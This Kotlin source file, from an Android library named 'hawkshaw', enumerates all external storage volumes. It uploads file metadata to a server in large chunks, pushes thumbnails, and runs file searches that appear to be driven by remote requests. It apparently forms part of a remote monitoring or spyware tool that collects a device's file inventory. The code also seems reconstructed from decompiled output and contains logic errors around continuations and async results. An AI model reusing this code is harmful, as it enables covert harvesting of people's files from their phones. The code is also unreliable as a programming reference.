package com.hawkshaw.library.features.media.files

import android.content.Context
import android.os.Build
import android.os.storage.StorageManager
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.annotation.RequiresApi
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.AppFileV2
import com.hawkshaw.library.datalayer.models.PushFileExplorerWalkV2Request
import com.hawkshaw.library.datalayer.models.Timestamp
import com.hawkshaw.library.features.media.filecrud.pushThumbnailsNew
import com.hawkshaw.library.ktextensions.plusSafe
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.flow.toList
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.File
import java.io.IOException
import java.lang.Exception
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.nio.file.attribute.BasicFileAttributes
import java.util.concurrent.CompletableFuture
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.function.BiPredicate
import kotlin.coroutines.Continuation
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

private const val TAG = "FileExplorerWalkV2"

/**
 * Get all external storage volumes on the device
 */
fun getExternalStorageVolumes(context: Context): List<File> {
    Log.d(TAG, "[DEBUG] getExternalStorageVolumes called with context: $context")
    val result = ArrayList<File>()
    
    if (Build.VERSION.SDK_INT >= 31) {
        Log.d(TAG, "[DEBUG] Using StorageManager.storageVolumes (SDK >= 31).")
        val storageManager = context.getSystemService(StorageManager::class.java)
        storageManager?.storageVolumes?.forEach { volume ->
            Log.d(TAG, "[DEBUG] Found volume: ${volume.getDescription(context)}, Directory: ${volume.directory}")
            volume.directory?.let { result.add(it) }
        }
    } else {
        Log.d(TAG, "[DEBUG] Using StorageManager.getVolumeList (SDK < 31).")
        try {
            val method = StorageManager::class.java.getMethod("getVolumeList")
            val storageManager = context.getSystemService(Context.STORAGE_SERVICE) as? StorageManager
            val volumes = method.invoke(storageManager) as? Array<Any>
            
            volumes?.forEach { volume ->
                val pathMethod = volume.javaClass.getMethod("getPath")
                val path = pathMethod.invoke(volume) as? String
                Log.d(TAG, "[DEBUG] Found volume via reflection. Path: $path")
                path?.let { result.add(File(it)) }
            }
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error getting storage volumes via reflection", e)
            e.printStackTrace() // Original printStackTrace
        }
    }
    
    val filteredResult = result.toList() // Ensure it's a List<File>
    Log.d(TAG, "[DEBUG] Initial volumes found: ${filteredResult.joinToString { it.path }}")

    if (Build.VERSION.SDK_INT >= 30) {
        Log.d(TAG, "[DEBUG] Adding app's external files directory (SDK >= 30).")
        App.getContext().getExternalFilesDir(null)?.let {
            Log.d(TAG, "[DEBUG] App's external files dir: ${it.path}")
            val listWithAppDir = filteredResult.plusSafe(it)
            Log.d(TAG, "[DEBUG] Volumes after adding app's external dir: ${listWithAppDir.joinToString { obj -> obj.path }}")
            return listWithAppDir.toList() //Ensure return type is List<File>
        }
    }
    
    Log.d(TAG, "[DEBUG] Returning final volumes: ${filteredResult.joinToString { it.path }}")
    return filteredResult
}

/**
 * File explorer result data class for serialization
 */
@kotlinx.serialization.Serializable
data class FileExplorerResult(
    val directory: String,
    val maxDepth: Int,
    val maxFiles: Int,
    val includeHidden: Boolean,
    val includeDirs: Boolean,
    val fileTypes: List<String>?,
    val namePattern: String?,
    val files: List<SerializedFile>
)

/**
 * Get a flow of files from external storage
 */
private fun getFiles(context: Context = App.getContext()) =
    getExternalStorageVolumes(context).also {
        Log.d(TAG, "[DEBUG] getFiles: Processing ${it.size} external storage volumes.")
    }.asFlow().map { file ->
        Log.d(TAG, "[DEBUG] getFiles: Mapping volume File to AppFileV2: ${file.path}")
        toAppFile(file)
    }

/**
 * Convert File to AppFileV2
 */
private fun toAppFile(file: File): AppFileV2 {
    Log.d(TAG, "[DEBUG] toAppFile called for: ${file.path}")
    val name = file.name
    val path = file.path
    val mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(file.extension)
    val timestamp = Timestamp(file.lastModified())
    val size = file.length()
    
    val appFile = AppFileV2(name, path, mimeType, timestamp, size)
    Log.d(TAG, "[DEBUG] Created AppFileV2: $appFile")
    return appFile
}

/**
 * Push file explorer data to server
 */
@RequiresApi(Build.VERSION_CODES.O)
suspend fun pushFileExplorerWalkV2(continuation: Continuation<Any>): Any {
    Log.d(TAG, "[DEBUG] pushFileExplorerWalkV2 called.")
    try {
        Log.d(TAG, "[DEBUG] Getting files for pushFileExplorerWalkV2.")
        val files = getFiles()
        val fileList = files.toList()
        Log.d(TAG, "[DEBUG] Collected ${fileList.size} files. Chunking with size 5000.")
        val chunkedFiles = fileList.chunked(5000)
        
        for ((index, chunk) in chunkedFiles.withIndex()) {
            Log.d(TAG, "[DEBUG] Pushing chunk ${index + 1}/${chunkedFiles.size}, size: ${chunk.size}")
            val request = PushFileExplorerWalkV2Request(index, chunk)
            Log.d(TAG, "[DEBUG] PushFileExplorerWalkV2Request: $request")
            val response = Injector.INSTANCE.mediaService.pushFileExplorerWalkV2(request)
            Log.d(TAG, "[DEBUG] Response for chunk $index: Success=${response.isSuccess}, ErrorMessage=${response.errorMessage}")

            if (!response.isSuccess) {
                Logger.e(
                    TAG,
                    "PushFileExplorerWalkV2: ${response.errorMessage}",
                    b = false,
                    i = 12,
                    nothing = null
                )
                Log.e(TAG, "[DEBUG] Push failed for chunk $index. Resuming continuation with Unit.")
                continuation.resume(Unit) // Assuming original logic intended to resume here
                return Unit // Return after resuming to avoid further processing or multiple resumes
            }
        }
        
        Log.d(TAG, "[DEBUG] All FileExplorer file chunks uploaded successfully.")
        Logger.d(TAG, "FileExplorer files uploaded successfully", false, 4, null)
        
        Log.d(TAG, "[DEBUG] Calling pushThumbnailsNew().")
        val thumbnailResult = pushThumbnailsNew()
        Log.d(TAG, "[DEBUG] pushThumbnailsNew finished. Resuming continuation with its result.")
        continuation.resume(thumbnailResult)
        return thumbnailResult
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] Error in pushFileExplorerWalkV2", e)
        Logger.e(TAG, "Error in pushFileExplorerWalkV2", e, false, 12, null)
        Log.d(TAG, "[DEBUG] Resuming continuation with Unit due to exception in pushFileExplorerWalkV2.")
        continuation.resume(Unit)
        return Unit
    }
}

/**
 * Request class for file explorer operations
 */
@kotlinx.serialization.Serializable
data class FileExplorerRequest(
    val directory: String? = null,
    val maxDepth: Int? = null,
    val maxFiles: Int? = null,
    val includeHidden: Boolean? = null,
    val includeDirs: Boolean? = null,
    val fileTypes: List<String>? = null,
    val namePattern: String? = null
)

/**
 * Find files with the specified criteria
 */
@RequiresApi(Build.VERSION_CODES.O)
fun findFilesV2(context: Context, request: FileExplorerRequest): List<SerializedFile> {
    Log.d(TAG, "[DEBUG] findFilesV2 called. Context: $context, Request: $request")
    val effectiveDirectory = request.directory ?: getExternalStorageDirectory().also {
        Log.d(TAG, "[DEBUG] findFilesV2: Directory not in request, using external storage: $it")
    }
    val effectiveMaxDepth = request.maxDepth ?: 3.also {
        Log.d(TAG, "[DEBUG] findFilesV2: MaxDepth not in request, using default: $it")
    }
    val effectiveMaxFiles = request.maxFiles ?: 100.also {
        Log.d(TAG, "[DEBUG] findFilesV2: MaxFiles not in request, using default: $it")
    }
    val effectiveIncludeHidden = request.includeHidden ?: false.also {
        Log.d(TAG, "[DEBUG] findFilesV2: IncludeHidden not in request, using default: $it")
    }
    val effectiveIncludeDirs = request.includeDirs ?: false.also {
        Log.d(TAG, "[DEBUG] findFilesV2: IncludeDirs not in request, using default: $it")
    }

    Log.d(TAG, "[DEBUG] Effective criteria for findFilesWithCriteria: Dir='$effectiveDirectory', Depth=$effectiveMaxDepth, Files=$effectiveMaxFiles, Hidden=$effectiveIncludeHidden, Dirs=$effectiveIncludeDirs, Types=${request.fileTypes}, Pattern='${request.namePattern}'")

    return findFilesWithCriteria(
        directory = effectiveDirectory,
        maxDepth = effectiveMaxDepth,
        maxFiles = effectiveMaxFiles,
        includeHidden = effectiveIncludeHidden,
        includeDirs = effectiveIncludeDirs,
        fileTypes = request.fileTypes,
        namePattern = request.namePattern
    )
}

/**
 * Find files based on provided criteria
 */
@RequiresApi(Build.VERSION_CODES.O)
private fun findFilesWithCriteria(
    directory: String,
    maxDepth: Int,
    maxFiles: Int,
    includeHidden: Boolean,
    includeDirs: Boolean,
    fileTypes: List<String>?,
    namePattern: String?
): List<SerializedFile> {
    Log.d(TAG, "[DEBUG] findFilesWithCriteria called. Dir: '$directory', Depth: $maxDepth, MaxFiles: $maxFiles, Hidden: $includeHidden, Dirs: $includeDirs, Types: $fileTypes, Pattern: '$namePattern'")
    val startPath = Paths.get(directory)
    if (!Files.exists(startPath)) {
        Log.w(TAG, "[DEBUG] Directory does not exist: $directory. Returning empty list.")
        // Original Log.w(TAG, "Directory does not exist: $directory")
        return emptyList()
    }
    Log.d(TAG, "[DEBUG] Start path exists: $startPath")

    val result = ArrayList<SerializedFile>()
    
    try {
        // Create file filter based on criteria
        val filterPredicate = BiPredicate<Path, BasicFileAttributes> { path, attrs ->
            val file = path.toFile()
            var allow = true
            // Log.v(TAG, "[DEBUG] Filtering path: ${file.absolutePath}") // Can be very verbose

            // Check hidden files
            if (!includeHidden && file.isHidden) {
                // Log.v(TAG, "[DEBUG] Path ${file.name} excluded: is hidden and includeHidden is false.")
                allow = false
            }
            
            // For directories
            if (attrs.isDirectory) {
                // Log.v(TAG, "[DEBUG] Path ${file.name} is a directory. Predicate result: true (for traversal).")
                return@BiPredicate true // Always include directories for traversal, actual adding to results is later
            }
            if (attrs.isRegularFile && allow) {
                if (namePattern != null && !file.name.contains(namePattern, ignoreCase = true)) {
                    allow = false
                }
                
                // Check file type match
                if (allow && !fileTypes.isNullOrEmpty()) {
                    val extension = file.extension.lowercase()
                    if (!fileTypes.map { it.lowercase() }.contains(extension)) {
                         // Log.v(TAG, "[DEBUG] Path ${file.name} excluded: extension '$extension' not in specified types $fileTypes.")
                        allow = false
                    }
                }
            } else if (!attrs.isRegularFile) {
                allow = false
            }
            // Log.v(TAG, "[DEBUG] Path ${file.name} predicate final result: $allow")
            allow
        }
        
        Log.d(TAG, "[DEBUG] Starting Files.find operation.")
        Files.find(startPath, maxDepth, filterPredicate)
            .limit(maxFiles.toLong())
            .forEach { path ->
                val file = path.toFile()
                // Log.d(TAG, "[DEBUG] Path found by Files.find: ${file.absolutePath}, isFile: ${file.isFile}, isDirectory: ${file.isDirectory}")
                if (file.isFile || (includeDirs && file.isDirectory)) {
                    if (file.isFile) {
                        // The following line will now rely on an existing/imported fileToSerializedFile
                        val serializedFile = fileToSerializedFile(file)
                        result.add(serializedFile)
                        Log.d(TAG, "[DEBUG] Added file to results: ${file.absolutePath}. Current count: ${result.size}")
                    } else if (includeDirs && file.isDirectory) {
                        // The following line will now rely on an existing/imported fileToSerializedFile
                        val serializedFile = fileToSerializedFile(file)
                        result.add(serializedFile)
                        Log.d(TAG, "[DEBUG] Added directory to results: ${file.absolutePath}. Current count: ${result.size}")
                    }
                }
            }
        Log.d(TAG, "[DEBUG] Files.find operation completed.")
    } catch (e: IOException) {
        Log.e(TAG, "[DEBUG] Error walking directory '$directory'", e)
        // Original Log.e(TAG, "Error walking directory", e)
    }
    
    Log.d(TAG, "[DEBUG] findFilesWithCriteria finished for '$directory'. Returning ${result.size} files.")
    return result
}

/**
 * Find files asynchronously
 */
@RequiresApi(Build.VERSION_CODES.O)
fun findFilesAsync(
    directory: String,
    maxDepth: Int,
    maxFiles: Int,
    includeHidden: Boolean,
    includeDirs: Boolean,
    fileTypes: List<String>?,
    namePattern: String?,
    continuation: Continuation<List<SerializedFile>>
): List<SerializedFile> {
    Log.d(TAG, "[DEBUG] findFilesAsync called. Dir: '$directory', Depth: $maxDepth, MaxFiles: $maxFiles, Hidden: $includeHidden, Dirs: $includeDirs, Types: $fileTypes, Pattern: '$namePattern'")
    val executor: ExecutorService = Executors.newSingleThreadExecutor()
    Log.d(TAG, "[DEBUG] SingleThreadExecutor created for findFilesAsync.")

    try {
        Log.d(TAG, "[DEBUG] Submitting findFilesWithCriteria to executor.")
        val future = CompletableFuture.supplyAsync({
            Log.d(TAG, "[DEBUG] findFilesAsync: Executing findFilesWithCriteria in background thread: ${Thread.currentThread().name}")
            findFilesWithCriteria(
                directory,
                maxDepth,
                maxFiles,
                includeHidden,
                includeDirs,
                fileTypes,
                namePattern
            )
        }, executor)
        
        future.whenComplete { result, exception ->
            Log.d(TAG, "[DEBUG] findFilesAsync: CompletableFuture completed. Thread: ${Thread.currentThread().name}")
            executor.shutdown()
            Log.d(TAG, "[DEBUG] findFilesAsync: Executor shutdown.")
            if (exception != null) {
                Log.e(TAG, "[DEBUG] findFilesAsync: Exception in CompletableFuture", exception)
                continuation.resumeWithException(exception)
            } else {
                Log.d(TAG, "[DEBUG] findFilesAsync: Success. Result size: ${result?.size}. Resuming continuation.")
                continuation.resume(result ?: emptyList())
            }
        }
        
        Log.d(TAG, "[DEBUG] findFilesAsync: CompletableFuture submitted. Returning placeholder emptyList.")
        return emptyList()
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] findFilesAsync: Exception during setup", e)
        executor.shutdown()
        Log.d(TAG, "[DEBUG] findFilesAsync: Executor shutdown due to exception during setup.")
        throw e
    }
}

/**
 * Convert a file explorer request result to JSON
 */
fun fileExplorerResultToJson(request: FileExplorerRequest, files: List<SerializedFile>): String {
    Log.d(TAG, "[DEBUG] fileExplorerResultToJson called. Request: $request, Files count: ${files.size}")
    val result = FileExplorerResult(
        directory = request.directory ?: getExternalStorageDirectory().also { Log.d(TAG, "[DEBUG] fileExplorerResultToJson: Defaulting directory to $it")},
        maxDepth = request.maxDepth ?: 3.also { Log.d(TAG, "[DEBUG] fileExplorerResultToJson: Defaulting maxDepth to $it")},
        maxFiles = request.maxFiles ?: 100.also { Log.d(TAG, "[DEBUG] fileExplorerResultToJson: Defaulting maxFiles to $it")},
        includeHidden = request.includeHidden ?: false.also { Log.d(TAG, "[DEBUG] fileExplorerResultToJson: Defaulting includeHidden to $it")},
        includeDirs = request.includeDirs ?: false.also { Log.d(TAG, "[DEBUG] fileExplorerResultToJson: Defaulting includeDirs to $it")},
        fileTypes = request.fileTypes,
        namePattern = request.namePattern,
        files = files
    )
    Log.d(TAG, "[DEBUG] Constructed FileExplorerResult: $result")

    val jsonString = Json.encodeToString(result)
    Log.d(TAG, "[DEBUG] Encoded to JSON string. Length: ${jsonString.length}. Snippet (first 100 chars): ${jsonString.take(100)}")
    return jsonString
}